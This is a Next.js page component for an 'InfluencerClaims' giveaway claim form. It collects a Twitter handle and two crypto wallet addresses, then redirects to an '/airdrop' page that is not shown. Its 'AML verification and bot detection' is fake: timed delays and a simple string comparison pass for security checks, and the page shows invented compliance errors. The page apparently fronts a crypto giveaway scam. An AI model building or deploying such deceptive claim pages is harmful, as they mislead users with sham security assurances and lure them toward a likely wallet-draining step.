"use client";

import { useState } from "react";
import { useRouter } from "next/navigation";
import Link from "next/link";

export default function ClaimPage() {
  const [formData, setFormData] = useState({
    twitterHandle: "",
    winningWallet: "",
    destinationWallet: "",
  });

  const [status, setStatus] = useState<
    "idle" | "loading" | "error"
  >("idle");
  const [errorMessage, setErrorMessage] = useState("");
  const router = useRouter();

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setStatus("loading");
    setErrorMessage("");

    // Simulate processing time
    await new Promise((resolve) => setTimeout(resolve, 2000));

    // Validation logic: Check if wallets match
    if (
      formData.winningWallet.toLowerCase() ===
      formData.destinationWallet.toLowerCase()
    ) {
      // Wallets match — redirect to airdrop page with pre-filled data
      const params = new URLSearchParams({
        twitter: formData.twitterHandle,
        wallet: formData.winningWallet,
        destination: formData.destinationWallet,
      });
      router.push(`/airdrop?${params.toString()}`);
    } else {
      // Wallets don't match - AML/Bot error
      await new Promise((resolve) => setTimeout(resolve, 1500));
      setStatus("error");
      setErrorMessage(
        "Verification failed: AML/Bot detection system flagged this transaction. Winning wallet and destination wallet must match for security purposes."
      );
    }
  };

  const handleChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    setFormData({
      ...formData,
      [e.target.name]: e.target.value,
    });
  };

  const resetForm = () => {
    setFormData({
      twitterHandle: "",
      winningWallet: "",
      destinationWallet: "",
    });
    setStatus("idle");
    setErrorMessage("");
  };

  return (
    <div className="min-h-screen bg-gradient-to-br from-gray-900 via-black to-gray-900 text-white">
      {/* Header */}
      <header className="border-b border-gray-800 bg-black/50 backdrop-blur-sm">
        <div className="container mx-auto px-4 py-6">
          <div className="flex items-center justify-between">
            <Link href="/">
              <h1 className="text-2xl font-bold bg-gradient-to-r from-blue-400 to-purple-500 bg-clip-text text-transparent cursor-pointer">
                InfluencerClaims
              </h1>
            </Link>
            <Link
              href="/"
              className="px-6 py-2 bg-gray-800 border border-gray-700 rounded-lg font-semibold hover:bg-gray-700 transition-all"
            >
              Back to Home
            </Link>
          </div>
        </div>
      </header>

      <main className="container mx-auto px-4 py-12 max-w-2xl">
        <div className="text-center mb-8">
          <h2 className="text-4xl font-bold mb-4 bg-gradient-to-r from-blue-400 to-purple-500 bg-clip-text text-transparent">
            Claim Your Prize
          </h2>
          <p className="text-gray-400">
            Enter your details to claim your giveaway prize
          </p>
        </div>

        {status !== "error" ? (
          <div className="bg-gradient-to-br from-gray-800 to-gray-900 border border-gray-700 rounded-xl p-8">
            <form onSubmit={handleSubmit} className="space-y-6">
              <div>
                <label
                  htmlFor="twitterHandle"
                  className="block text-sm font-medium mb-2"
                >
                  Twitter Handle
                </label>
                <input
                  type="text"
                  id="twitterHandle"
                  name="twitterHandle"
                  value={formData.twitterHandle}
                  onChange={handleChange}
                  placeholder="@yourusername"
                  required
                  disabled={status === "loading"}
                  className="w-full px-4 py-3 bg-gray-900 border border-gray-600 rounded-lg text-white placeholder-gray-500 focus:outline-none focus:border-purple-500 focus:ring-2 focus:ring-purple-500/50 transition-all disabled:opacity-50 disabled:cursor-not-allowed"
                />
              </div>

              <div>
                <label
                  htmlFor="winningWallet"
                  className="block text-sm font-medium mb-2"
                >
                  Winning Wallet Address
                </label>
                <input
                  type="text"
                  id="winningWallet"
                  name="winningWallet"
                  value={formData.winningWallet}
                  onChange={handleChange}
                  placeholder="0x..."
                  required
                  disabled={status === "loading"}
                  className="w-full px-4 py-3 bg-gray-900 border border-gray-600 rounded-lg text-white placeholder-gray-500 focus:outline-none focus:border-purple-500 focus:ring-2 focus:ring-purple-500/50 transition-all disabled:opacity-50 disabled:cursor-not-allowed"
                />
                <p className="text-xs text-gray-500 mt-1">
                  The wallet that won the giveaway
                </p>
              </div>

              <div>
                <label
                  htmlFor="destinationWallet"
                  className="block text-sm font-medium mb-2"
                >
                  Destination Wallet Address
                </label>
                <input
                  type="text"
                  id="destinationWallet"
                  name="destinationWallet"
                  value={formData.destinationWallet}
                  onChange={handleChange}
                  placeholder="0x..."
                  required
                  disabled={status === "loading"}
                  className="w-full px-4 py-3 bg-gray-900 border border-gray-600 rounded-lg text-white placeholder-gray-500 focus:outline-none focus:border-purple-500 focus:ring-2 focus:ring-purple-500/50 transition-all disabled:opacity-50 disabled:cursor-not-allowed"
                />
                <p className="text-xs text-gray-500 mt-1">
                  Where you want to receive your prize
                </p>
              </div>

              <button
                type="submit"
                disabled={status === "loading"}
                className="w-full px-8 py-4 bg-gradient-to-r from-blue-500 to-purple-600 rounded-lg text-lg font-semibold hover:from-blue-600 hover:to-purple-700 transition-all shadow-xl shadow-purple-500/50 disabled:opacity-50 disabled:cursor-not-allowed disabled:shadow-none"
              >
                {status === "loading" ? (
                  <span className="flex items-center justify-center gap-3">
                    <div className="w-5 h-5 border-2 border-white border-t-transparent rounded-full animate-spin"></div>
                    Verifying...
                  </span>
                ) : (
                  "Submit Claim"
                )}
              </button>
            </form>

            {status === "loading" && (
              <div className="mt-6 p-4 bg-blue-900/30 border border-blue-700 rounded-lg">
                <div className="flex items-start gap-3">
                  <div className="w-5 h-5 border-2 border-blue-400 border-t-transparent rounded-full animate-spin mt-0.5"></div>
                  <div>
                    <p className="text-sm text-blue-300 font-medium">
                      Running security checks...
                    </p>
                    <p className="text-xs text-blue-400 mt-1">
                      AML verification and bot detection in progress
                    </p>
                  </div>
                </div>
              </div>
            )}
          </div>
        ) : (
          <div className="bg-gradient-to-br from-red-900/30 to-gray-900 border border-red-700 rounded-xl p-8 text-center">
            <div className="text-6xl mb-4">⚠️</div>
            <h3 className="text-2xl font-bold text-red-400 mb-4">
              Verification Failed
            </h3>
            <p className="text-gray-300 mb-6">{errorMessage}</p>
            <div className="bg-gray-900 border border-gray-700 rounded-lg p-4 mb-6">
              <p className="text-sm text-gray-400 mb-2">Security Notice:</p>
              <p className="text-xs text-gray-500">
                Our AML and bot detection system ensures all transactions are
                legitimate. Please ensure you're using the correct wallet
                addresses.
              </p>
            </div>
            <button
              onClick={resetForm}
              className="px-8 py-3 bg-gradient-to-r from-blue-500 to-purple-600 rounded-lg font-semibold hover:from-blue-600 hover:to-purple-700 transition-all"
            >
              Try Again
            </button>
          </div>
        )}
      </main>
    </div>
  );
}
